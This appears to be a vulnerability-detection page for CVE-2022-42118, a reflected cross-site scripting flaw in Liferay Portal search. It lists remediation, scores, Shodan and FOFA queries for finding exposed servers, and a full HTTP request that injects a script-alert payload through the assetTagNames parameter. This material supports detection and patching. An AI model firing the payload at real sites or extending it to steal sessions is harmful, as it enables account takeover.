---
layout: post
cve_id: CVE-2022-42118
title: Liferay Portal - Cross-site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-42118.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-42118.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'Unauthenticated attackers can inject malicious JavaScript through the tag
  parameter in the Portal Search module to steal Liferay Portal user session cookies
  and credentials.

  '
remediation: 'Update to Liferay Portal 7.4.3+, DXP 7.1 fix pack 27+, DXP 7.2 fix pack
  15+, or DXP 7.3 service pack 3+.

  '
reference:
- https://issues.liferay.com/browse/LPE-17342
- https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/cve-2022-42118
- https://nvd.nist.gov/vuln/detail/CVE-2022-42118
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-42118
  cwe-id: CWE-79
  epss-score: 0.08478
  epss-percentile: 0.92076
  cpe: cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
metadata:
  vendor: liferay
  product: liferay_portal
  shodan-query: html:"var Liferay"
  fofa-query: body="var Liferay"
tags:
- cve
- cve2022
- liferay
- xss
- vuln
---

## üîç Vulnerability Description
A Cross-site scripting (XSS) vulnerability in the Portal Search module in Liferay Portal 7.1.0 through 7.4.2, and Liferay DXP 7.1 before fix pack 27, 7.2 before fix pack 15, and 7.3 before service pack 3 allows remote attackers to inject arbitrary web script or HTML via the `tag` parameter.


## üåê HTTP Request
```nohighlight
GET /web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

